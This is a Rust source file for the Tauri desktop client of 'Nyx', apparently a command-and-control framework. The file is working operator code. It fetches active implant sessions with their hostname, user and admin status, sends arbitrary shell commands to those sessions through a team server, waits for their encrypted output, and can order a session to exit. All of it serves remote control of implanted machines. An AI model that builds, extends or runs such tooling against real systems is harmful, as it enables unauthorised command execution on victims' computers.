//! Nyx desktop client (Tauri v2) — Rust core.
//!
//! Tauri commands are the bridge to the React frontend. They proxy to the team
//! server's REST API over HTTP. Commands are synchronous (Tauri runs them on a
//! thread pool), mirroring [`nyx-cli`].

use std::time::{Duration, Instant};

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionView {
    pub id: String,
    pub beacon_id: u32,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: u8,
    pub pid: u32,
    pub is_admin: u8,
    pub pending: usize,
}

/// Fetch the list of active sessions from the team server.
#[tauri::command]
fn list_sessions(server: String) -> Result<Vec<SessionView>, String> {
    ureq::get(&format!("{server}/api/sessions"))
        .call()
        .map_err(|e| e.to_string())?
        .into_json::<Vec<SessionView>>()
        .map_err(|e| e.to_string())
}

/// Queue a shell task and block until the encrypted output returns.
#[tauri::command]
fn shell(server: String, session: String, args: String) -> Result<String, String> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "shell", "args": args },
    });
    let ack: serde_json::Value = ureq::post(&format!("{server}/api/task"))
        .send_json(body)
        .map_err(|e| e.to_string())?
        .into_json()
        .map_err(|e| e.to_string())?;
    let task_id = ack["task_id"].as_u64().ok_or("server returned no task_id")?;

    let deadline = Instant::now() + Duration::from_secs(15);
    loop {
        let rs: serde_json::Value = ureq::get(&format!("{server}/api/results"))
            .query("session", &session)
            .call()
            .map_err(|e| e.to_string())?
            .into_json()
            .map_err(|e| e.to_string())?;
        if let Some(r) = rs
            .as_array()
            .and_then(|a| a.iter().find(|r| r["task_id"].as_u64() == Some(task_id)))
        {
            match r["kind"].as_str() {
                Some("output") => return Ok(r["text"].as_str().unwrap_or("").to_string()),
                Some("error") => {
                    return Err(format!("implant error: {}", r["text"]));
                }
                _ => {}
            }
        }
        if Instant::now() >= deadline {
            return Err("timeout waiting for output".into());
        }
        std::thread::sleep(Duration::from_millis(300));
    }
}

/// Task the session to exit.
#[tauri::command]
fn exit_session(server: String, session: String) -> Result<(), String> {
    let body = serde_json::json!({ "session": session, "command": { "type": "exit" } });
    let _ = ureq::post(&format!("{server}/api/task")).send_json(body);
    Ok(())
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .invoke_handler(tauri::generate_handler![
            list_sessions,
            shell,
            exit_session
        ])
        .run(tauri::generate_context!())
        .expect("error while running Nyx client");
}
